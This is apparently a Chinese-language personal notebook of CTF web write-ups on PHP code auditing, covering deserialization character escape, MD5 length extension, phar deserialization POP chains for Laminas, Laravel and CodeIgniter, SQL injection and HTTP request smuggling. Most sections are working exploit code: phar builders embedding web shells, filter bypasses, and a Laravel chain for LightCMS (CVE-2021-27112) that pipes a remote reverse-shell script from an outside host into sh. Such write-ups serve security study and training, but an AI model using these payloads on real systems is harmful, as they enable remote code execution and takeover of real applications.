# 代码审计

# 代码审计

### 反序列化字符逃逸

### ****[0CTF 2016]piapiapia****

dirsearch

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled.png)

源码泄露后，seay看一下

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%201.png)

class.php[show_profile]

profile.php[$profile=$user→show_profile($username)→unserialize($profile)→$photo = base64_encode(file_get_conents($profile[’photo’]))]

**$profile**

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%202.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%203.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%204.png)

在进行update_profile操作的时候会将序列化的数据中的select,insert,update,delete,where替换为hacker而where和hacker字符长度不同可以产生反序列化字符逃逸每个where可以逃逸一个字符

想要使profile.php中能够echo出config的内容在nickname这里构造自己想要的photo值

where”;s:5:”photo”;s:10:”config.php”;}

在后面一共有34个字符那么就传入34个where来进行替换逃逸

[https://www.notion.so](https://www.notion.so)

对nickname的过滤可以直接通过数组来绕过

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%205.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%206.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%207.png)

### 哈希拓展攻击

[https://github.com/JoyChou93/md5-extension-attack](https://github.com/JoyChou93/md5-extension-attack)

### 变量覆盖

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%208.png)

### ****[SWPUCTF 2016]Web blogsys****

通过找回密码泄露admin的salt值MD5

YWI0ZDIyOTI1ZDI2OGRkNjkzN2U0MWVkYmU4MWU5N2U

解开base64

ab4d22925d268dd6937e41edbe81e97e

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%209.png)

哈希拓展攻击伪造

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2010.png)

Payload:  '\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00admin'
Payload urlencode: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00admin
md5: 6122c04e8a1f3529d556199960ef2556

删除用户的反序列化payload

userid为cookie中user的值base64解码后的第一个数字

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2011.png)

```php
<?php
class admin
{
    var $name = "admin";
    var $check = "6122c04e8a1f3529d556199960ef2556";
    var $data = "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00admin";
    var $method = "del_user";
    var $userid = "2";
}

$a = new admin();
$api = serialize(base64_encode($a));
```

Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9

用api.php?api=传入

ps：需要在一个新的页面传入，大概是因为对session值有检测

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2012.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2013.png)

此时userid值在数据库中被置空了id值不会被传入新值，可以进行变量覆盖

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2014.png)

### ****[D3CTF 2019]EzUpload****

题目直接就是代码

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename  =  $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('hacker!!!');
        }
    }
    public function checkurl(){
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('hacker!!!');
        }
    }
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('hacker!!!');
        }
    }
    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('hacker!!!');
        }
        file_put_contents($this->userdir."/".$this->filename,$content);
    }
    public function remove(){
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }
    public function count($dir) {
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
    public function __toString() {
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);
if($_POST['action'] === "upload") {
    $dir->upload();
}
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}

```

**函数功能分析：**

- upload

创建沙盒，对url，filename及后缀名进行检测，在内容检测后写入

- remove

删除文件

- count

扫文件数目

在对url的检测中ban了file和php，可以利用data伪协议来传输.htaccess来绕过黑名单

```php
AddHandler php7-script .txt
```

action=upload&filename=.htaccess&url=data:image/png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2015.png)

由于构析函数中当前路径为根目录

想要写shell的话还需要拿到绝对路径

没有ban phar伪协议可以做phar反序列化

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
}
$a=new dir();
$b=new dir();
$b->userdir='..';
$a->userdir=$b;
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'."__HALT_COMPILER();"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

用http远程包含后再用phar伪协议触发phar反序列化

也可以选择data伪协议来写入

action=upload&filename=1.txt&url=data:image/png;base64,R0lGODlhX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqqAAAAAQAAABEAAAABAAAAAAB0AAAATzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7TzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7TjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO30IAAAAdGVzdC50eHQEAAAAZ/A3YwQAAAAMfn/YtgEAAAAAAAB0ZXN0ArqSkUWwQg9QITOBtgBp0RLFDjkCAAAAR0JNQg==

action=upload&filename=1.jpg&url=phar://upload/c47b21fcf8f0bc8b3920541abd8024fd/1.jpg

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2016.png)

这是目录781877bda0783aac

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
}
$a=new dir();
$a->filename='/var/www/html/abebb7c39f4b5e46/upload/c47b21fcf8f0bc8b3920541abd8024fd/shell';
$a->userdir = '<?php eval($_POST[1]);?>';
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'."__HALT_COMPILER();"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

需要gzip打包，phar伪协议可以识别zip,gzip打包过的phar包

这个时候就已经有shell.txt了加上.htacess就可以直接解析了

### ****[HarekazeCTF2019]Avatar Uploader 2****

seay扫一下，就两个点，一个上传一个包含。大概也就这样利用

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2017.png)

先看upload.php

```php

<?php
error_reporting(0);

require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);

// check whether file is uploaded
if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
  error('No file was uploaded.');
}

// check file size
if ($_FILES['file']['size'] > 256000) {
  error('Uploaded file is too large.');
}

// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png'])) {
  error('Uploaded file is not PNG format.');
}

// check file width/height
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size[0] > 256 || $size[1] > 256) {
  error('Uploaded image is too large.');
}
if ($size[2] !== IMAGETYPE_PNG) {
  // I hope this never happens...
  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
}

// ok
$filename = bin2hex(random_bytes(4)) . '.png';
move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);

$session->set('avatar', $filename);
flash('info', 'Your avatar has been successfully updated!');
redirect('/');
```

有对文件类型的检查和png_header的检查，最后会将文件随机文件名人后放到uploads下

伪造文件头上传png

```php
<?php
$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('exp.css', '<?php system($_GET["wumonster"]); ?>');
$phar->setStub($png_header. '<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2018.png)

用uitl.php中函数进行解密

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2019.png)

更改cookie中theme的值来进行文件包含，这里能够更改的原因是因为

[https://www.notion.so](https://www.notion.so)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2020.png)

命令执行拿flag就可

### ****[HMGCTF2022]Fan Website****

关键代码

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2021.png)

在imguploudAcion中有正则匹配过滤，在imgdeleteAction中存在unlink大概就是反序列化，在正则中有phar文件头，可以gzip压缩绕过

那么现在主要就是找pop链，seay扫了一下后发现报告都来自vendor中，查看composer.json后发现

大量的引用了laminas框架，laminas是zend的替代项目

小搜一手发现存在CVE-2021-3007的Zend漏洞同时影响了部分laminas项目

别人的wp都说是已知的链子，为什么我找不到

那就研究一下这条链子吧

```php
<?php

namespace Laminas\View\Resolver{
    class TemplateMapResolver{
        protected $map = ["setBody"=>"system"];
    }
}
namespace Laminas\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        function __construct(){
            $this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
        }
    }
}

namespace Laminas\Log\Writer{
    abstract class AbstractWriter{}

    class Mail extends AbstractWriter{
        protected $eventsToMail = ["cat /flag"];
        protected $subjectPrependText = null;
        protected $mail;
        function __construct(){
            $this->mail = new \Laminas\View\Renderer\PhpRenderer();
        }
    }
}

namespace Laminas\Log{
    class Logger{
        protected $writers;
        function __construct(){
            $this->writers = [new \Laminas\Log\Writer\Mail()];
        }
    }
}

namespace{
    $a = new \Laminas\Log\Logger();
    //echo base64_encode(serialize($a));

    @unlink('test.phar');

    $phar=new Phar('test.phar');
    $phar->startBuffering();
    //设置头部
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    //将自定义的meta-data存入manifest
    $phar->setMetadata($a);
    $phar->addFromString("test.txt",str_repeat('aaa',1000000));
    //$phar->addFromString("test.txt","test");
    //签名自动计算
    $phar->stopBuffering();
}
```

把链子中文件的漏洞点都人脑过了一遍决定还是debug看看怎么跑的

调的时候踩了一些坑

链子生成phar文件，然后gzip打包上传的时候发现有大小限制

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2022.png)

用str_repeat给文件填充了一些信息 /var/www/public/img/9ea7925c965967e978aecbb5fcb0ec3d.png

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2023.png)

图片删除这里要路径，删除后应该可以通过unlink来触发反序列化

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2024.png)

步入Logger

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2025.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2026.png)

在遍历writer值后进入Mail，这里是对应参数设置的判断函数

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2027.png)

最后结果

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2028.png)

### **[CVE-2021-27112]LightCMS**

```php
<?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this->connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this->queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('curl https://your-shell.com/49.232.206.37:23456 | sh');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($PendingBroadcast);
    $phar -> stopBuffering();
    rename('phar.phar','phar.jpg');

}
```

后台admin/admin登录

上传图片phar.jpg

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2029.png)

然后再对应路由访问就能远程触发phar

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2030.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2031.png)

触发方式很新颖

### ****[D3CTF 2019]EasyWeb****

从index路由过来到Render_model,get_view的sql语句明显有二次注入

```php
<?php

class Render_model extends CI_Model
{
	public $username;
	public $userView;

	public function insert_view($username, $content){
		$this->username = $username;
		$this->userView = $content;
		$this->db->insert('userRender',$this);
	}

	public function get_view($userId){
		$res = $this->db->query("SELECT username FROM userTable WHERE userId='$userId'")->result();
		if($res){
			$username = $res[0]->username;
			$username = $this->sql_safe($username);
			$username = $this->safe_render($username);
			$userView = $this->db->query("SELECT userView FROM userRender WHERE username='$username'")->result();
			$userView = $userView[0]->userView;
			return $userView;
		}else{
			return false;
		}
	}
	private function safe_render($username){
		$username = str_replace(array('{','}'),'',$username);
		return $username;
	}

	private function sql_safe($sql){
		if(preg_match('/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)|/i',$sql)){
			return '';
		}else{
			return $sql;
		}
	}
}
```

需要绕过一下safe_render和sql_safe函数的过滤

过滤顺序是先sql_safe再safe_render所以可以先使用花括弧将被过滤的关键子隔开在通过sql_safe后safe_render又会花括弧去掉实现绕过

非预期：直接注册`' uni{on sele{ct  0x7b7b7068707d7d73797374656d2827636174202f57656c4c5f546831735f31345f666c346727293b7b7b2f7068707d7d #`

7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2032.png)

[2019 D^3 CTF-easyweb预期解复现 | Somnus's blog](https://nikoeurus.github.io/2019/12/12/D%5E3ctf-easyweb/#CI-POP)

跟着调一下，也是学者写一个新路由

display进入

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2033.png)

createTemplate创建模板

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2034.png)

传入的$template进入_getTemplateId()，在这个函数里拼接为$_templateId

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2035.png)

调用Smart_Template_Source的load方法，跟进去

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2036.png)

在load里面正则匹配了$type和$name

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2037.png)

Smart_Resource load方法对data做了很多处理，从函数名看的话大概是注册模板和缓存的

判断控制流是否在已知的类型中在的话就实例化`Smarty_Internal_Resource_Stream()`

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2038.png)

进入后调用`populate`方法,这个方法把data:换成了data://然后调用getContent()

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2039.png)

fopen来模板字符串

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2040.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2041.png)

然后中间就是一大堆smarty模板的处理

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2042.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2043.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2044.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2045.png)

然后最后otput出来

那么把data换成phar是不是就可以触发phar反序列化然后rce了呢，然而php.ini中并没有打开phar.readonly,默认为true，所以没有办法用上面的fopen来触发反序列化

但是中间对流的判断是支持php协议的

传入`php:phar:///etc/passwd`

但是往后调会发现有is_file函数，is_file函数触发phar是没有限制的

**POP链**

全局搜索function __destruct后发现了两个

一个Cache_memcached.php

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2046.png)

一个Cache_redis.php

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2047.png)

显然Cache_redis.php控制更加简单，只要$this→_redis为true就可以控制任意类的close()方法

全局搜close，Session_database_driver.php中当$this→_lock为true就可以调用_release_lock()

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2048.png)

当$this→_platform值为mysql时又可以触发任意类的query

在全局的query中只有DB_driver.php有较为完整的定义

```php
<?php 

class CI_Cache_redis
{
	protected $_redis;

	public function __construct($_redis=""){
		$this->_redis = $_redis;
	}
}

class CI_Session_database_driver extends CI_Session_driver
{
	protected $_platform = "mysql";

	public function __construct($db=""){
		parent::__construct($db);
	}
}

abstract class CI_Session_driver
{
	protected $_lock = true;
	protected $_db;

	public function __construct($db=""){
		$this->_db = $db;
	}
}

abstract class CI_DB_driver
{
	public $cache_on = true;
}

class CI_DB extends CI_DB_driver { }

class CI_DB_mysqli_driver extends CI_DB 
{
	
	public $dbdriver = "../../../../../../tmp/303175f9437d5145afdb341a6236bf2e/somnus";
}

$redis = new CI_Cache_redis(new CI_Session_database_driver(new CI_DB_mysqli_driver()));
echo base64_encode(serialize($redis));

$phar = new Phar("easyweb.phar");
$phar->startBuffering();
$phar->setStub("GIF89A"."__HALT_COMPILER();"); //设置stub，增加gif文件头用以欺骗检测
$phar->setMetadata($redis); //将自定义meta-data存入manifest
$phar->addFromString("test.jpg", "test"); //添加要压缩的文件
$phar->stopBuffering();

 ?>
```

### ****[D3CTF 2019]Showhub****

用户密码加密方式

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2049.png)

注册功能调用save方法

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2050.png)

![Untitled](%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%206658870bb1d4438684d807c1b2ec69fb/Untitled%2051.png)

注册时传入id为null，那么实质上sql语句是

INSERT INTO `$this->tbname` SET %s VALUE(%s)

格式化字符串逃逸

`INSERT INTO `user`(`username`,`password`) VALUE('admin','wumonster') ON DUPLICATE KEY UPDATE password='8c1e24558a1317623e71a0def84dba438dfda181d7d96c1223456825b9e1a2f9';`

username=admin%1$',%1$'wumonster%1$') ON DUPLICATE KEY UPDATE password=%1$'8c1e24558a1317623e71a0def84dba438dfda181d7d96c1223456825b9e1a2f9%1$'#&password=123

### ATS HTTP走私

用CL-TE的方法走私

所谓`CL-TE`，就是当收到存在两个请求头的请求包时，前端代理服务器只处理`Content-Length`这一请求头，而后端服务器会遵守`RFC2616`的规定，忽略掉`Content-Length`，处理`Transfer-Encoding`
这一请求头

```
POST / HTTP/1.1
Host: e4550371bc.showhub.d3ctf.io
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8e7cipookibqvk2c3govosvfms
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 660
Transfer-Encoding: chunked

0

POST /WebConsole/exec HTTP/1.1
Host: e4550371bc.showhub.d3ctf.io
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer:  http://ec057b43d9.showhub.d3ctf.io/WebConsole/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8e7cipookibqvk2c3govosvfms
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

cmd=cat+/flag&a=
```